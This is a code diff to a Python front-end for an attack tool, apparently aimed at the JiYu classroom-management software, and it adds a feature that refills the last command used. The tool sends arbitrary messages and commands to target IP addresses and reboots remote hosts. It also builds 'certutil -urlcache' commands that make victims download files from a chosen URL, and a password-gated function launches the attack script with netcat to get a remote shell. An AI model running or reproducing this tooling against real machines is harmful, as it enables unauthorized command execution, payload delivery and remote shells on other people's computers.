@@ -9,6 +9,9 @@ import time #计时
 import os
 import subprocess
 
+#定义一个字典,存储上次命令
+latest_command = {"ip": "", "c": "", "msg": "", "range": "", "url": "", "file_storage": ""}
+
 '''资源路径处理函数，用于打包后访问文件'''
 def resource_path(relative_path):
     """获取资源的绝对路径，兼容开发环境和打包后的环境"""
@@ -19,6 +22,15 @@ def resource_path(relative_path):
         # 未打包时，使用当前工作目录
         base_path = os.path.abspath(".")
     return os.path.join(base_path, relative_path)
+
+def get_app_dir():
+    """返回当前应用程序所在目录（兼容打包和开发环境）"""
+    if getattr(sys, 'frozen', False):
+        # 打包后，sys.executable 是 exe 的路径
+        return os.path.dirname(sys.executable)
+    else:
+        # 开发环境，__file__ 是当前脚本路径
+        return os.path.dirname(__file__)
 
 
 '''这里是实现禁止多线程的部分(点了一个按钮在完成之前不能再点一个)'''
@@ -131,6 +143,7 @@ def ipsearch():
                 pass
         except:
             pass
+        print(">>> ")
     start_task(task)
 
 #ip发送消息函数
@@ -138,28 +151,59 @@ def send_message():
     def task():
         Jiyu.args.c = None #先清除command属性，防止误发送
         Jiyu.args.msg = None #先清除msg属性，防止误发送
-        if ip == "N":
-            print("\n\n请输入目标ip地址:")
-            ip_addr = input()
-            Jiyu.args.ip = ip_addr
-            time.sleep(0.05)#防止输出乱序
+        if len(latest_command["msg"]) != 0:
+            print("发现上次的命令!是否需要填充?(填充请输入T)")
+            answer = input()
+            if answer == "T":
+                Jiyu.args.ip = latest_command["ip"]
+                Jiyu.args.msg = latest_command["msg"]
+                Jiyu.args.l = latest_command["range"]
+            else:
+                global ip_addr, msg, Range
+                if ip == "N":
+                    print("\n\n请输入目标ip地址:")
+                    ip_addr = input()
+                    Jiyu.args.ip = ip_addr
+                    time.sleep(0.05)#防止输出乱序
+                else:
+                    ip_addr = ip
+                    Jiyu.args.ip = ip_addr
+                    time.sleep(0.05)#防止输出乱序
+                print("请输入要发送的内容:")
+                msg = '"'+input()+'"'
+                Jiyu.args.msg = msg
+                time.sleep(0.05)#防止输出乱序
+                print("你需要循环多少次(不需要请填1)")
+                Range = 1
+                Range = int(input())
+                Jiyu.args.l = Range
+                time.sleep(0.05)#防止输出乱序
         else:
-            ip_addr = ip
-            Jiyu.args.ip = ip_addr
+            if ip == "N":
+                print("\n\n请输入目标ip地址:")
+                ip_addr = input()
+                Jiyu.args.ip = ip_addr
+                time.sleep(0.05)#防止输出乱序
+            else:
+                ip_addr = ip
+                Jiyu.args.ip = ip_addr
+                time.sleep(0.05)#防止输出乱序
+            print("请输入要发送的内容:")
+            msg = '"'+input()+'"'
+            Jiyu.args.msg = msg
             time.sleep(0.05)#防止输出乱序
-        print("请输入要发送的内容:")
-        msg = '"'+input()+'"'
-        Jiyu.args.msg = msg
-        time.sleep(0.05)#防止输出乱序
-        print("你需要循环多少次(不需要请填1)")
-        Range = 1
-        Range = int(input())
-        Jiyu.args.l = Range
-        time.sleep(0.05)#防止输出乱序
+            print("你需要循环多少次(不需要请填1)")
+            Range = 1
+            Range = int(input())
+            Jiyu.args.l = Range
+            time.sleep(0.05)#防止输出乱序
         print("------------------------------\n你的目标ip地址是:    "+ip_addr+",\n发送的消息是:  "+msg+",\n要循环:  "+str(Range)+"  次"+",\n发送端口:  "+str(Jiyu.args.p)+",\n循环时间间隔:  "+str(Jiyu.args.t)+"  单位:秒\n------------------------------")
         print("是否正确？(正确请输入T)")
         answer = input()
         if answer == "T":
+            latest_command["ip"] = Jiyu.args.ip
+            latest_command["msg"] = Jiyu.args.msg
+            latest_command["range"] = Jiyu.args.l
             Jiyu.args.e = None #清除命令行指令,防止重复查询ip(即Jiyu.args.e = "g"的情况)
             Jiyu.run_from_cmd()
             time.sleep(0.05)#防止输出乱序
@@ -189,28 +233,59 @@ def send_command():
             app.cli._clear_output()#清空输入
             Jiyu.args.c = None #先清除command属性，防止误发送
             Jiyu.args.msg = None #先清除msg属性，防止误发送
-            if ip == "N":
-                print("\n\n请输入目标ip地址:")
-                ip_addr = input()
-                Jiyu.args.ip = ip_addr
-                time.sleep(0.05)#防止输出乱序
+            if len(latest_command["c"]) != 0:
+                print("发现上次的命令!是否需要填充?(填充请输入T)")
+                answer = input()
+                if answer == "T":
+                    Jiyu.args.ip = latest_command["ip"]
+                    Jiyu.args.c = latest_command["c"]
+                    Jiyu.args.l = latest_command["range"]
+                else:
+                    global ip_addr, cmd, Range
+                    if ip == "N":
+                        print("\n\n请输入目标ip地址:")
+                        ip_addr = input()
+                        Jiyu.args.ip = ip_addr
+                        time.sleep(0.05)#防止输出乱序
+                    else:
+                        ip_addr = ip
+                        Jiyu.args.ip = ip_addr
+                        time.sleep(0.05)#防止输出乱序
+                    print("请输入要执行的命令:")
+                    cmd = '"'+input()+'"'
+                    Jiyu.args.c = cmd
+                    time.sleep(0.05)#防止输出乱序
+                    print("你需要循环多少次(不需要请填1)")
+                    Range = 1
+                    Range = int(input())
+                    Jiyu.args.l = Range
+                    time.sleep(0.05)#防止输出乱序
             else:
-                ip_addr = ip
-                Jiyu.args.ip = ip_addr
+                if ip == "N":
+                    print("\n\n请输入目标ip地址:")
+                    ip_addr = input()
+                    Jiyu.args.ip = ip_addr
+                    time.sleep(0.05)#防止输出乱序
+                else:
+                    ip_addr = ip
+                    Jiyu.args.ip = ip_addr
+                    time.sleep(0.05)#防止输出乱序
+                print("请输入要执行的命令:")
+                cmd = '"'+input()+'"'
+                Jiyu.args.c = cmd
                 time.sleep(0.05)#防止输出乱序
-            print("请输入要执行的命令:")
-            cmd = '"'+input()+'"'
-            Jiyu.args.c = cmd
-            time.sleep(0.05)#防止输出乱序
-            print("你需要循环多少次(不需要请填1)")
-            Range = 1
-            Range = int(input())
-            Jiyu.args.l = Range
-            time.sleep(0.05)#防止输出乱序
+                print("你需要循环多少次(不需要请填1)")
+                Range = 1
+                Range = int(input())
+                Jiyu.args.l = Range
+                time.sleep(0.05)#防止输出乱序
             print("------------------------------\n你的目标ip地址是:    "+ip_addr+",\n发送的命令是:  "+Jiyu.args.c+",\n要循环:  "+str(Range)+"  次"+",\n发送端口:  "+str(Jiyu.args.p)+",\n循环时间间隔:  "+str(Jiyu.args.t)+"  单位:秒\n------------------------------")
             print("是否正确？(正确请输入T)")
             answer = input()
             if answer == "T":
+                latest_command["ip"] = Jiyu.args.ip
+                latest_command["c"] = Jiyu.args.c
+                latest_command["range"] = Jiyu.args.l
                 Jiyu.args.e = None #清除命令行指令,防止重复查询ip(即Jiyu.args.e = "g"的情况)
                 Jiyu.run_from_cmd()
                 time.sleep(0.05)#防止输出乱序
@@ -242,21 +317,39 @@ def reboot():
             app.cli._clear_output()#清空输入
             app.cli._clear_output()#清空输入
             app.cli._clear_output()#清空输入
-            if ip == "N":
-                print("\n\n请输入目标ip地址:")
-                ip_addr = input()
-                Jiyu.args.ip = ip_addr
-                time.sleep(0.05)#防止输出乱序
+            if len(latest_command["ip"]) != 0:
+                print("发现上次的命令!是否需要填充?(填充请输入T)")
+                answer = input()
+                if answer == "T":
+                    Jiyu.args.ip = latest_command["ip"]
+                else:
+                    global ip_addr
+                    if ip == "N":
+                        print("\n\n请输入目标ip地址:")
+                        ip_addr = input()
+                        Jiyu.args.ip = ip_addr
+                        time.sleep(0.05)#防止输出乱序
+                    else:
+                        ip_addr = ip
+                        Jiyu.args.ip = ip_addr
+                        time.sleep(0.05)#防止输出乱序
             else:
-                ip_addr = ip
-                Jiyu.args.ip = ip_addr
-                time.sleep(0.05)#防止输出乱序
+                if ip == "N":
+                    print("\n\n请输入目标ip地址:")
+                    ip_addr = input()
+                    Jiyu.args.ip = ip_addr
+                    time.sleep(0.05)#防止输出乱序
+                else:
+                    ip_addr = ip
+                    Jiyu.args.ip = ip_addr
+                    time.sleep(0.05)#防止输出乱序
             answer = input("你将向ip地址为 "+ip_addr+" 的主机发送重启指令,确认请输入T\n")
             if answer == "T":
                 answer = "F"
                 time.sleep(0.05)#防止输出乱序
                 answer = input("[再次确认]你将向ip地址为 "+ip_addr+" 的主机发送重启指令,确认请输入T\n")
                 if answer == "T":
+                    latest_command["ip"] = Jiyu.args.ip
                     print("好的,将发送重启指令!")
                     Jiyu.args.e = "r"
                     Jiyu.run_from_cmd()
@@ -291,31 +384,67 @@ def file_download():
             app.cli._clear_output()#清空输入
             app.cli._clear_output()#清空输入
             app.cli._clear_output()#清空输入
-            if ip == "N":
-                print("\n\n请输入目标ip地址:")
-                ip_addr = input()
-                Jiyu.args.ip = ip_addr
-                time.sleep(0.05)#防止输出乱序
+            if len(latest_command["url"]) != 0:
+                print("发现上次的命令!是否需要填充?(填充请输入T)")
+                answer = input()
+                if answer == "T":
+                    Jiyu.args.ip = latest_command["ip"]
+                    url = latest_command["url"]
+                    storage = latest_command["storage"]
+                    url = '"certutil -urlcache -split -f '+url
+                    url = url+' '+storage+'"'
+                    Jiyu.args.c = url
+                else:
+                    global ip_addr,url_backup
+                    if ip == "N":
+                        print("\n\n请输入目标ip地址:")
+                        ip_addr = input()
+                        Jiyu.args.ip = ip_addr
+                        time.sleep(0.05)#防止输出乱序
+                    else:
+                        ip_addr = ip
+                        Jiyu.args.ip = ip_addr
+                        time.sleep(0.05)#防止输出乱序
+                    print("请输入文件的链接:")
+                    url = input()
+                    url_backup = url
+                    url = '"certutil -urlcache -split -f '+url
+                    time.sleep(0.05)#防止输出乱序
+                    print("请输入文件保存位置(含文件名):")
+                    storage = input()
+                    url = url+' '+storage+'"'
+                    Jiyu.args.c = url
+                    time.sleep(0.05)#防止输出乱序
             else:
-                ip_addr = ip
-                Jiyu.args.ip = ip_addr
+                if ip == "N":
+                    print("\n\n请输入目标ip地址:")
+                    ip_addr = input()
+                    Jiyu.args.ip = ip_addr
+                    time.sleep(0.05)#防止输出乱序
+                else:
+                    ip_addr = ip
+                    Jiyu.args.ip = ip_addr
+                    time.sleep(0.05)#防止输出乱序
+                print("请输入文件的链接:")
+                url = input()
+                url_backup = url
+                url = '"certutil -urlcache -split -f '+url
                 time.sleep(0.05)#防止输出乱序
-            print("请输入文件的链接:")
-            url = input()
-            url_backup = url
-            url = '"certutil -urlcache -split -f '+url
-            time.sleep(0.05)#防止输出乱序
-            print("请输入文件保存位置(含文件名):")
-            storage = input()
-            url = url+' '+storage+'"'
-            Jiyu.args.c = url
-            time.sleep(0.05)#防止输出乱序
+                print("请输入文件保存位置(含文件名):")
+                storage = input()
+                url = url+' '+storage+'"'
+                Jiyu.args.c = url
+                time.sleep(0.05)#防止输出乱序
             print("\n------------------------------------")
             print("你的目标ip地址是:    "+ip_addr+",\n发送的文件链接是:  "+url_backup+",\n文件的保存地址是:  "+storage+",\n发送端口:  "+str(Jiyu.args.p))
             print("------------------------------------\n")
             print("是否正确？(正确请输入T)")
             answer = input()
             if answer == "T":
+                latest_command["ip"] = Jiyu.args.ip
+                latest_command["url"] = url
+                latest_command["storage"] = storage
+                latest_command["range"] = Jiyu.args.l
                 Jiyu.args.e = None
                 Jiyu.run_from_cmd()
                 Jiyu.args.e = None #清除命令行指令
@@ -454,13 +583,12 @@ def GET_Shell():
         truly_password = 'b094e7bd28ee3b802f1abb86e6e4d688'
         if truly_password == password:
             app.cli._clear_output()
-            # 清空五次（原代码逻辑）
             for _ in range(5):
                 app.cli._clear_output()
             
             if ip == "N":
                 print("\n\n请输入目标ip地址:")
-                ip_addr = input()
+                ip_addr = input().strip()
                 time.sleep(0.05)
             else:
                 ip_addr = ip
@@ -468,24 +596,25 @@ def GET_Shell():
             
             print("请确认文件分发服务器是否运行!")
             print("请输入文件服务器运行ip!")
-            server_ip = input()
+            server_ip = input().strip()
             time.sleep(0.05)
             
-            # 构建命令行参数
-            script_path = os.path.join(os.path.dirname(__file__), 'Jiyu_udp_attack.py')
-            cmd = [
-                'python', script_path,
-                '-ip', ip_addr,
-                '-lip', server_ip,
-                '-e', 'nc'
-            ]
+            base_dir = get_app_dir()
+            if getattr(sys, 'frozen', False):
+                # 打包环境：直接运行 exe
+                script_path = os.path.join(base_dir, 'Jiyu_udp_attack.exe')
+                cmd = [script_path, '-ip', ip_addr, '-lip', server_ip, '-e', 'nc']
+            else:
+                # 开发环境：用 python 运行脚本
+                script_path = os.path.join(base_dir, 'Jiyu_udp_attack.py')
+                cmd = ['python', script_path, '-ip', ip_addr, '-lip', server_ip, '-e', 'nc']
             
             print("\n------------------------------------")
             print("你的目标ip地址是:    "+ip_addr)
             print("准备在新窗口中运行攻击脚本...")
             print("------------------------------------\n")
             
-            # 启动新进程（不等待，独立窗口）
+            # 启动新进程（独立窗口）
             subprocess.Popen(cmd, creationflags=subprocess.CREATE_NEW_CONSOLE)
             
             print("攻击脚本已在独立窗口中运行，请关注该窗口。")
